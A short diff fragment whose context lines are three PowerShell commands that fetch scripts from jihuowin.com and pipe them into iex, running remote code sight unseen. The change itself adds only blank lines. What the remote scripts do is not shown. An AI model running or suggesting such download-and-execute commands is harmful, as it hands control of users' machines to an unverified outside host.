@@ -8,3 +8,5 @@ irm jihuowin.com/plus/nostartpro | iex
 irm jihuowin.com/plus/killall | iex
 irm jihuowin.com/plus/shadow | iex
 
+
+
